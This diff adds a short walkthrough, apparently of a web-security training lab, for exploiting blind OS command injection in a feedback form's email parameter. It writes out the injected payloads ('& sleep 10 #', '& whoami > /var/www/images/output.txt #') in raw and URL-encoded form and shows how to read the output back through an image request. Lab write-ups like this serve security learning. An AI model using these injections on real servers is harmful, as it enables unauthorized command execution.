@@ -1,0 +1,20 @@
+Blind OS Command Injection with output redirection
+Goal: Exploit the blind command injection and redirect the output from whoami to /var/www/images
+
+1)
+-Click Submit feedback
+-Fill out form, Click Submit feedback
+-Send Post to repeater
+-email parameter is vulnerable, email=mike%40aol.com & sleep 10, email=mike%40aol.com+%26+sleep+10+%23
+
+2)
+-Images by default are filtered out of requests, turn it on
+-Click Home
+-Post in repeater
+-email=mike%40aol.com & whoami > /var/www/images/output.txt #, email=mike%40aol.com+%26+whoami+>+/var/www/images/output.txt+%23
+
+3)
+-Take one of the Image gets and send to repeater
+-Change out the name of the image file with output.txt
+-Click Send
+-> peter-f71S9H
